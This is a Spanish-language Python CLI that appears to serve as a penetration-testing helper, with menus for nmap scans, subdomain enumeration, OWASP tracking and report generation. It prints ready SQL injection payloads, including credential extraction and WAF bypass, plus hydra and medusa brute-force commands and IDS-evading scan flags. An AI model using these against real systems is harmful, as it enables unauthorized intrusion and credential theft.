#!/usr/bin/env python3
"""
PENTEST ASSISTANT CLI — authorized environments only
"""

import os
import sys
import subprocess
import datetime

# ─── ANSI colors ────────────────────────────────────────────
R    = "\033[0m"
BOLD = "\033[1m"
DIM  = "\033[2m"
RED  = "\033[91m"
GRN  = "\033[92m"
YLW  = "\033[93m"
BLU  = "\033[94m"
MAG  = "\033[95m"
CYN  = "\033[96m"
WHT  = "\033[97m"
GRY  = "\033[90m"

def clr():
    os.system("clear" if os.name == "posix" else "cls")

# ─── LOGO ───────────────────────────────────────────────────
SHIELD = f"""{GRN}
              ░░░░░░░░░░░░░░░░░░░░░░░
            ░░                       ░░
           ░░   ███████████████████   ░░
          ░░   ██                 ██   ░░
          ░░   ██  {RED}▄▀▄{GRN}  ██  {RED}▄▀▄{GRN}  ██   ░░
          ░░   ██  {RED}█▀█{GRN}  ██  {RED}█▀█{GRN}  ██   ░░
          ░░   ██                 ██   ░░
          ░░   ██   {WHT}▄███████▄{GRN}   ██   ░░
          ░░   ██  {WHT}██       ██{GRN}  ██   ░░
          ░░   ██  {WHT}█  ▀▀▀  █{GRN}  ██   ░░
          ░░   ██   {WHT}▀███████▀{GRN}   ██   ░░
          ░░   ██                 ██   ░░
           ░░   ███████████████████   ░░
            ░░          ░░           ░░
              ░░░░░░░░░░░░░░░░░░░░░░░{R}"""

WORDART = f"""{GRN}{BOLD}
  ██████╗ ███████╗███╗  ██╗████████╗███████╗███████╗████████╗
  ██╔══██╗██╔════╝████╗ ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
  ██████╔╝█████╗  ██╔██╗██║   ██║   █████╗  ███████╗   ██║
  ██╔═══╝ ██╔══╝  ██║╚████║   ██║   ██╔══╝  ╚════██║   ██║
  ██║     ███████╗██║ ╚███║   ██║   ███████╗███████║   ██║
  ╚═╝     ╚══════╝╚═╝  ╚══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝{R}
{GRY}             ╔═════════════════════════════════════════╗
             ║  {RED}●{GRY} ASSISTANT v1.0  //  {YLW}authorized only{GRY}  ║
             ╚═════════════════════════════════════════╝{R}
"""

def banner():
    print(SHIELD)
    print(WORDART)

def ask(prompt, default=""):
    val = input(f"  {CYN}▸{R} {prompt}{f' [{default}]' if default else ''}: ").strip()
    return val if val else default

def info(msg):  print(f"  {BLU}ℹ{R}  {msg}")
def ok(msg):    print(f"  {GRN}✔{R}  {msg}")
def warn(msg):  print(f"  {YLW}⚠{R}  {msg}")
def err(msg):   print(f"  {RED}✖{R}  {msg}")
def cmd(c):     print(f"\n  {GRY}${R} {BOLD}{GRN}{c}{R}")
def dim(msg):   print(f"  {GRY}{msg}{R}")
def hdr(msg):   print(f"\n{CYN}{BOLD}  ┌─ {msg} {'─'*(50-len(msg))}┐{R}\n")
def sep():      print(f"  {GRY}{'─'*58}{R}")

def press_enter():
    input(f"\n  {GRY}[Enter para continuar]{R}")

def menu(title, options):
    print(f"\n{BOLD}  {title}{R}\n")
    for i, (label, _) in enumerate(options, 1):
        print(f"  {CYN}{i}{R}. {label}")
    print(f"  {GRY}0{R}. ← volver")
    sep()
    while True:
        try:
            choice = input(f"  {CYN}opción{R}: ").strip()
            if choice == "0":
                return None
            idx = int(choice) - 1
            if 0 <= idx < len(options):
                return options[idx]
        except (ValueError, IndexError):
            pass
        err("opción inválida")

# ═══════════════════════════════════════════════════════════
#  1. NMAP HELPER
# ═══════════════════════════════════════════════════════════

def nmap_helper():
    clr(); banner()
    hdr("NMAP HELPER")
    target = ask("target (IP / rango / hostname)")
    if not target:
        warn("target vacío, usando placeholder TARGET"); target = "TARGET"

    presets = [
        ("quick scan   — servicios principales (-sV -sC -T4)",  "quick"),
        ("full ports   — todos los puertos (-p-)",              "full"),
        ("vuln scripts — NSE vulnerability scan",               "vuln"),
        ("OS detect    — fingerprinting de sistema operativo",  "os"),
        ("UDP scan     — top 200 puertos UDP",                  "udp"),
        ("stealth      — SYN scan fragmentado",                 "stealth"),
        ("custom       — construir comando manualmente",        "custom"),
    ]

    choice = menu("seleccioná un preset", presets)
    if choice is None: return
    label, mode = choice

    cmds_map = {
        "quick":   f"nmap -sV -sC -T4 --open {target}",
        "full":    f"nmap -p- -sV -T4 --open {target}",
        "vuln":    f"nmap -sV --script vuln -T4 {target}",
        "os":      f"sudo nmap -O -sV -T4 {target}",
        "udp":     f"sudo nmap -sU -sV --top-ports 200 {target}",
        "stealth": f"nmap -sS -T2 -f --data-length 25 {target}",
    }

    tips_map = {
        "quick":   ["Ideal como primera pasada rápida",
                    "-sC corre scripts NSE por defecto",
                    "--open muestra solo puertos abiertos"],
        "full":    ["Escanea los 65535 puertos — puede tardar",
                    "Guardá salida: agregar -oN resultado.txt",
                    "Combiná con grep para filtrar"],
        "vuln":    ["Puede generar ruido — cuidado en prod",
                    "Revisá CVEs en NVD / exploit-db",
                    "Complementá con nuclei para validar"],
        "os":      ["Requiere privilegios root",
                    "No siempre preciso detrás de firewalls",
                    "Usá con -sV para más contexto"],
        "udp":     ["UDP es lento — top-ports equilibra velocidad",
                    "Buscá DNS (53), SNMP (161), TFTP (69)",
                    "Requiere sudo"],
        "stealth": ["SYN scan no completa el 3-way handshake",
                    "-f fragmenta paquetes para evadir IDS básicos",
                    "Firewalls modernos igual lo detectan"],
    }

    if mode == "custom":
        hdr("CUSTOM NMAP")
        flags = ask("flags adicionales", "-sV -sC")
        ports = ask("puertos (vacío = default)", "")
        p_flag = f"-p {ports} " if ports else ""
        final = f"nmap {flags} {p_flag}{target}"
        tips = ["Revisá man nmap para más opciones"]
    else:
        final = cmds_map[mode]
        tips = tips_map[mode]

    hdr("COMANDO GENERADO")
    cmd(final)
    sep()
    for t in tips:
        dim(f"  // {t}")

    print()
    run = ask("¿ejecutar ahora? (s/n)", "n").lower()
    if run == "s":
        warn("ejecutando — asegurate de tener autorización")
        try:
            subprocess.run(final.split(), check=False)
        except FileNotFoundError:
            err("nmap no encontrado — instalá con: sudo apt install nmap")

    press_enter()

# ═══════════════════════════════════════════════════════════
#  2. SUBDOMINIOS
# ═══════════════════════════════════════════════════════════

def subdomain_enum():
    clr(); banner()
    hdr("ENUMERACIÓN DE SUBDOMINIOS")
    domain = ask("dominio objetivo", "ejemplo.com")

    presets = [
        ("pasivo (OSINT) — subfinder + assetfinder + amass", "passive"),
        ("activo — amass brute + dnsx",                      "active"),
        ("cert transparency — crt.sh",                       "cert"),
        ("dns brute — ffuf / gobuster",                      "dns"),
    ]

    choice = menu("modo de enumeración", presets)
    if choice is None: return
    label, mode = choice

    hdr("COMANDOS GENERADOS")

    cmds = {
        "passive": [
            (False, f"subfinder -d {domain} -o subfinder.txt"),
            (False, f"assetfinder --subs-only {domain} >> subs.txt"),
            (False, f"amass enum -passive -d {domain} -o amass.txt"),
            (False, f"cat subfinder.txt amass.txt subs.txt | sort -u > all_subs.txt"),
            (True,  "# pipeline de verificación:"),
            (False, f"httpx -l all_subs.txt -title -tech-detect -status-code"),
        ],
        "active": [
            (False, f"amass enum -active -brute -d {domain}"),
            (False, f"dnsx -l wordlist.txt -d {domain} -a -resp"),
            (False, f"httpx -l all_subs.txt -title -tech-detect -status-code"),
        ],
        "cert": [
            (False, f'curl -s "https://crt.sh/?q=%.{domain}&output=json" | jq \'.[].name_value\' | sort -u'),
            (True,  "# también: https://transparencyreport.google.com/"),
        ],
        "dns": [
            (False, f"ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://FUZZ.{domain} -mc 200,301 -t 50"),
            (False, f"gobuster dns -d {domain} -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt -t 50"),
        ],
    }

    for is_comment, c in cmds[mode]:
        if is_comment:
            dim(c)
        else:
            cmd(c)

    sep()
    dim("  // combiná todos los resultados con: sort -u")
    dim("  // herramientas: subfinder, amass, dnsx, httpx, ffuf, gobuster")
    press_enter()

# ═══════════════════════════════════════════════════════════
#  3. SQLi PAYLOADS
# ═══════════════════════════════════════════════════════════

def sqli_payloads():
    clr(); banner()
    hdr("SQL INJECTION — PAYLOADS")
    url = ask("URL con parámetro vulnerable", "https://target.com/page?id=1")

    presets = [
        ("detección básica",    "detect"),
        ("union-based",         "union"),
        ("blind time-based",    "blind"),
        ("sqlmap automatizado", "sqlmap"),
        ("WAF bypass",          "bypass"),
        ("error-based",         "error"),
    ]

    choice = menu("tipo de SQLi", presets)
    if choice is None: return
    label, mode = choice

    hdr(f"PAYLOADS — {label.upper()}")

    payloads = {
        "detect": [
            ("'",                          "comilla simple — trigger de error SQL"),
            ("' -- -",                     "comentario — cierra la query"),
            ("' OR '1'='1",                "OR siempre verdadero"),
            ("' AND '1'='2",               "siempre falso — compará respuesta"),
            ("' AND SLEEP(5)-- -",         "time-based — si tarda 5s = vulnerable"),
            ("1' ORDER BY 1-- -",          "detectar cantidad de columnas"),
        ],
        "union": [
            ("' ORDER BY 3-- -",           "paso 1: contar columnas"),
            ("' UNION SELECT null,null,null-- -", "paso 2: confirmar columnas"),
            ("' UNION SELECT 1,database(),user()-- -", "db y usuario actual"),
            ("' UNION SELECT 1,version(),@@hostname-- -", "versión del motor"),
            ("' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -", "listar tablas"),
            ("' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -", "listar columnas"),
            ("' UNION SELECT 1,concat(username,0x3a,password),3 FROM users-- -", "extraer datos"),
        ],
        "blind": [
            ("' AND SLEEP(5)-- -",         "MySQL — delay 5s"),
            ("'; WAITFOR DELAY '0:0:5'--", "MSSQL — delay 5s"),
            ("' AND 1=(SELECT 1 FROM pg_sleep(5))--", "PostgreSQL — delay 5s"),
            ("' AND IF(1=1,SLEEP(5),0)-- -", "MySQL condicional"),
            ("' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -", "extracción char a char"),
        ],
        "sqlmap": [
            (f"sqlmap -u \"{url}\" --batch --dbs",  "listar bases de datos"),
            (f"sqlmap -u \"{url}\" -D db_name --tables", "listar tablas"),
            (f"sqlmap -u \"{url}\" -D db_name -T users --dump", "dumpear tabla"),
            (f"sqlmap -u \"{url}\" --level=5 --risk=3 --batch", "detección agresiva"),
            (f"sqlmap -u \"{url}\" --tamper=space2comment --batch", "evadir WAF básico"),
            (f"sqlmap -u \"{url}\" --forms --batch", "auto-detectar formularios"),
        ],
        "bypass": [
            ("' /*!UNION*/ /*!SELECT*/ null,user()-- -", "comentarios inline MySQL"),
            ("' UNION%20SELECT%20null,user()--",         "URL encoding de espacios"),
            ("'/**/UNION/**/SELECT/**/null,user()--",    "comentarios como espacios"),
            ("'%09UNION%09SELECT%09null,user()--",       "TAB como separador"),
            ("--tamper=space2comment,between,randomcase", "sqlmap tamper combinado"),
        ],
        "error": [
            ("' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", "MySQL extractvalue"),
            ("' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -", "MySQL updatexml"),
            ("' AND (SELECT COUNT(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)-- -", "MySQL floor error"),
        ],
    }

    for payload, desc in payloads[mode]:
        print(f"\n  {GRN}{BOLD}{payload}{R}")
        dim(f"     → {desc}")

    sep()
    press_enter()

# ═══════════════════════════════════════════════════════════
#  4. BRUTEFORCE
# ═══════════════════════════════════════════════════════════

WL_MAP = {
    "1": ("/usr/share/wordlists/rockyou.txt",
          "rockyou.txt — 14M+ passwords"),
    "2": ("/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
          "10k más comunes"),
    "3": ("/usr/share/seclists/Discovery/Web-Content/common.txt",
          "SecLists — web content"),
    "4": ("/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
          "dirbuster medium"),
    "5": ("/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
          "subdomains 5000"),
}

def bruteforce():
    clr(); banner()
    hdr("BRUTEFORCE / FUZZING")
    target = ask("URL o host objetivo", "https://target.com/login")

    tools = [
        ("hydra    — login forms, SSH, FTP, Telnet, etc.", "hydra"),
        ("ffuf     — web fuzzing (dirs, params, vhosts)",  "ffuf"),
        ("gobuster — directory & DNS brute",               "gobuster"),
        ("medusa   — paralelo, multi-protocolo",           "medusa"),
    ]

    choice = menu("herramienta", tools)
    if choice is None: return
    _, tool = choice

    hdr("WORDLIST")
    for k, (path, desc) in WL_MAP.items():
        print(f"  {CYN}{k}{R}. {BOLD}{desc}{R}")
        dim(f"     {path}")
    print()

    wl_choice = ask("elegí wordlist (1-5)", "1")
    wl_path, wl_name = WL_MAP.get(wl_choice, WL_MAP["1"])
    host = target.replace("https://","").replace("http://","").split("/")[0]

    hdr("COMANDO GENERADO")

    if tool == "hydra":
        form_path  = ask("path del formulario", "/login")
        user_field = ask("campo usuario", "username")
        pass_field = ask("campo password", "password")
        fail_str   = ask("string de fallo en respuesta", "invalid")
        cmd(f'hydra -L users.txt -P {wl_path} {host} http-post-form "{form_path}:{user_field}=^USER^&{pass_field}=^PASS^:F={fail_str}"')
        dim("  // SSH:  hydra -L users.txt -P wordlist.txt ssh://TARGET")
        dim("  // FTP:  hydra -L users.txt -P wordlist.txt ftp://TARGET")
        dim("  // RDP:  hydra -t 1 -V -f -l admin -P wordlist.txt rdp://TARGET")

    elif tool == "ffuf":
        mode_opts = [
            ("directory fuzzing — buscar rutas",        "dir"),
            ("vhost fuzzing — subdominios virtuales",   "vhost"),
            ("parameter fuzzing — parámetros GET/POST", "param"),
        ]
        mc = menu("modo ffuf", mode_opts)
        if mc is None: return
        _, fmode = mc
        if fmode == "dir":
            cmd(f"ffuf -w {wl_path} -u {target}/FUZZ -mc 200,301,302,403 -t 50 -o ffuf_dirs.json")
        elif fmode == "vhost":
            cmd(f'ffuf -w {wl_path} -u {target} -H "Host: FUZZ.{host}" -fs 0 -t 40')
        elif fmode == "param":
            cmd(f"ffuf -w {wl_path} -u {target}?FUZZ=test -fs 0 -t 40")
        dim("  // -fs para filtrar por tamaño de respuesta")
        dim("  // -fc para filtrar por código HTTP")
        dim("  // -of json para exportar resultados")

    elif tool == "gobuster":
        cmd(f"gobuster dir -u {target} -w {wl_path} -t 40 --no-error -o gobuster.txt")
        dim("  // -x php,html,txt para buscar extensiones")
        dim("  // -k para ignorar certificados TLS inválidos")
        dim("  // modo DNS: gobuster dns -d domain.com -w wordlist.txt")

    elif tool == "medusa":
        user = ask("usuario (o archivo con -U)", "admin")
        cmd(f"medusa -h {host} -u {user} -P {wl_path} -M http -t 10")
        dim("  // -M ssh para SSH, -M ftp para FTP, -M rdp para RDP")

    sep()
    dim(f"  // wordlist: {wl_name}")
    press_enter()

# ═══════════════════════════════════════════════════════════
#  5. OWASP CHECKLIST
# ═══════════════════════════════════════════════════════════

OWASP = [
    ("A01 — Control de acceso roto",       "IDOR, escalada de privilegios, bypass de auth",       "CRÍTICO", RED),
    ("A02 — Fallas criptográficas",        "TLS/SSL, datos en tránsito, hashing de contraseñas", "ALTO",    YLW),
    ("A03 — Inyección (SQLi, XSS, SSTI)",  "Validación de inputs, queries parametrizadas",        "CRÍTICO", RED),
    ("A04 — Diseño inseguro",              "Modelado de amenazas, flujos de negocio",             "ALTO",    YLW),
    ("A05 — Configuración incorrecta",     "Headers HTTP, errores verbose, puertos expuestos",    "MEDIO",   BLU),
    ("A06 — Componentes vulnerables",      "npm audit, CVEs, versiones desactualizadas",          "ALTO",    YLW),
    ("A07 — Fallas de autenticación",      "Brute force, weak passwords, MFA bypass",             "CRÍTICO", RED),
    ("A08 — Integridad de datos",          "Deserialización insegura, supply chain attacks",      "ALTO",    YLW),
    ("A09 — Logging insuficiente",         "Trazabilidad de eventos, alertas de seguridad",       "MEDIO",   BLU),
    ("A10 — SSRF",                         "Server-Side Request Forgery a recursos internos",     "ALTO",    YLW),
]

def owasp_checklist():
    done = set()
    while True:
        clr(); banner()
        hdr("OWASP TOP 10 — CHECKLIST")
        pct = int(len(done) / len(OWASP) * 100)
        filled = int(pct / 5)
        bar = f"{GRN}{'█' * filled}{GRY}{'░' * (20-filled)}{R}"
        print(f"  progreso: {bar}  {BOLD}{pct}%{R}  ({len(done)}/{len(OWASP)} verificados)\n")
        sep()

        for i, (name, desc, sev, color) in enumerate(OWASP, 1):
            chk = f"{GRN}✔{R}" if i in done else f"{GRY}○{R}"
            print(f"  {CYN}{i:2}{R}. {chk}  {BOLD}{name}{R}  {color}[{sev}]{R}")
            if i not in done:
                dim(f"        {desc}")

        sep()
        print(f"  {GRY}Ingresá número para toggle  |  r = resetear  |  0 = volver{R}")
        action = input(f"\n  {CYN}>{R} ").strip().lower()

        if action == "0":
            break
        elif action == "r":
            done.clear()
        else:
            try:
                n = int(action)
                if 1 <= n <= len(OWASP):
                    done.discard(n) if n in done else done.add(n)
            except ValueError:
                err("opción inválida")

# ═══════════════════════════════════════════════════════════
#  6. GENERAR REPORTE
# ═══════════════════════════════════════════════════════════

def generar_reporte():
    clr(); banner()
    hdr("GENERADOR DE REPORTE MARKDOWN")
    target_name = ask("nombre del target / proyecto")
    tester      = ask("nombre del tester", "pentester")
    scope       = ask("scope (ej: app web, API, red interna)")
    date_start  = ask("fecha inicio", datetime.date.today().strftime("%Y-%m-%d"))
    date_end    = ask("fecha fin",    datetime.date.today().strftime("%Y-%m-%d"))

    findings = []
    print(f"\n  {YLW}Cargá los hallazgos (Enter vacío en título para terminar){R}")
    while True:
        print(f"\n  {CYN}── hallazgo #{len(findings)+1}{R}")
        title = input(f"  {CYN}▸{R} título: ").strip()
        if not title: break
        sevs = ["Crítico", "Alto", "Medio", "Bajo", "Informativo"]
        print("  severidad: " + "  ".join(f"{CYN}{i+1}{R}={s}" for i,s in enumerate(sevs)))
        try:
            sev_idx = int(ask("  (1-5)", "3")) - 1
            sev = sevs[max(0, min(sev_idx, 4))]
        except (ValueError, IndexError):
            sev = "Medio"
        desc  = ask("  descripción breve")
        remed = ask("  remediación recomendada")
        findings.append((title, sev, desc, remed))

    sev_order = {"Crítico":0,"Alto":1,"Medio":2,"Bajo":3,"Informativo":4}
    findings.sort(key=lambda f: sev_order.get(f[1], 9))

    counts = {"Crítico":0,"Alto":0,"Medio":0,"Bajo":0,"Informativo":0}
    for _, sev, _, _ in findings:
        counts[sev] += 1

    lines = []
    lines.append(f"# Reporte de Penetration Testing — {target_name}")
    lines.append(f"\n| Campo | Detalle |")
    lines.append(f"|-------|---------|")
    lines.append(f"| **Target** | {target_name} |")
    lines.append(f"| **Tester** | {tester} |")
    lines.append(f"| **Scope** | {scope} |")
    lines.append(f"| **Período** | {date_start} → {date_end} |")
    lines.append(f"| **Fecha reporte** | {datetime.date.today()} |")
    lines.append(f"\n---\n")
    lines.append(f"## Resumen Ejecutivo\n")
    lines.append(f"Se realizó una evaluación de seguridad sobre **{target_name}** "
                 f"durante el período comprendido entre {date_start} y {date_end}.")
    lines.append(f"\nSe identificaron **{len(findings)} hallazgos** en total:\n")
    for sev, cnt in counts.items():
        if cnt:
            lines.append(f"- **{sev}:** {cnt}")
    lines.append(f"\n---\n")
    lines.append(f"## Metodología\n")
    for m in ["Reconocimiento pasivo y activo (OSINT, nmap, subfinder)",
              "Enumeración de servicios y versiones",
              "Análisis de vulnerabilidades (OWASP Top 10)",
              "Explotación controlada en entorno autorizado",
              "Post-explotación y análisis de impacto"]:
        lines.append(f"- {m}")
    lines.append(f"\n---\n")
    lines.append(f"## Hallazgos\n")

    sev_icons = {"Crítico":"🔴","Alto":"🟠","Medio":"🟡","Bajo":"🟢","Informativo":"🔵"}
    for i, (title, sev, desc, remed) in enumerate(findings, 1):
        icon = sev_icons.get(sev, "⚪")
        lines.append(f"### {i}. {icon} {title}\n")
        lines.append(f"**Severidad:** {sev}  ")
        lines.append(f"\n**Descripción:** {desc}  ")
        lines.append(f"\n**Remediación:** {remed}\n")
        lines.append(f"---\n")

    lines.append(f"## Conclusiones\n")
    lines.append("Se recomienda remediar los hallazgos **Críticos** y **Altos** con prioridad inmediata.")
    lines.append("Programar re-test tras la implementación de las correcciones.")
    lines.append(f"\n*Reporte generado con pentest_cli.py — {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}*")

    filename = f"pentest_{target_name.replace(' ','_')}_{datetime.date.today()}.md"
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    hdr("REPORTE GENERADO")
    ok(f"guardado: {BOLD}{filename}{R}")
    dim(f"  // {len(findings)} hallazgos documentados")
    print()
    dim("  // convertir a PDF:")
    cmd(f"pandoc {filename} -o reporte.pdf")
    dim("  // convertir a Word:")
    cmd(f"pandoc {filename} -o reporte.docx")
    press_enter()

# ═══════════════════════════════════════════════════════════
#  MENÚ PRINCIPAL
# ═══════════════════════════════════════════════════════════

def main():
    while True:
        clr()
        banner()

        print(f"  {GRY}┌────────────────────────────────────────────────────────┐{R}")
        print(f"  {GRY}│{R}  {BOLD}RECONOCIMIENTO{R}                                          {GRY}│{R}")
        print(f"  {GRY}│{R}  {CYN}1{R}. nmap helper                                          {GRY}│{R}")
        print(f"  {GRY}│{R}  {CYN}2{R}. enumeración de subdominios                           {GRY}│{R}")
        print(f"  {GRY}├────────────────────────────────────────────────────────┤{R}")
        print(f"  {GRY}│{R}  {BOLD}EXPLOTACIÓN{R}                                             {GRY}│{R}")
        print(f"  {GRY}│{R}  {CYN}3{R}. SQLi payloads                                        {GRY}│{R}")
        print(f"  {GRY}│{R}  {CYN}4{R}. bruteforce / fuzzing                                 {GRY}│{R}")
        print(f"  {GRY}├────────────────────────────────────────────────────────┤{R}")
        print(f"  {GRY}│{R}  {BOLD}ANÁLISIS{R}                                                {GRY}│{R}")
        print(f"  {GRY}│{R}  {CYN}5{R}. OWASP Top 10 checklist                               {GRY}│{R}")
        print(f"  {GRY}│{R}  {CYN}6{R}. generar reporte (.md)                                {GRY}│{R}")
        print(f"  {GRY}├────────────────────────────────────────────────────────┤{R}")
        print(f"  {GRY}│{R}  {GRY}0{R}. salir                                                  {GRY}│{R}")
        print(f"  {GRY}└────────────────────────────────────────────────────────┘{R}")
        print()
        warn("Solo para entornos con autorización explícita del propietario.")
        sep()

        choice = input(f"\n  {CYN}opción{R}: ").strip()

        if choice == "0":
            clr()
            print(SHIELD)
            print(f"\n  {GRN}stay legal — hasta la próxima 🔒{R}\n")
            sys.exit(0)
        elif choice == "1": nmap_helper()
        elif choice == "2": subdomain_enum()
        elif choice == "3": sqli_payloads()
        elif choice == "4": bruteforce()
        elif choice == "5": owasp_checklist()
        elif choice == "6": generar_reporte()
        else:
            err("opción inválida")
            import time; time.sleep(0.8)

if __name__ == "__main__":
    main()
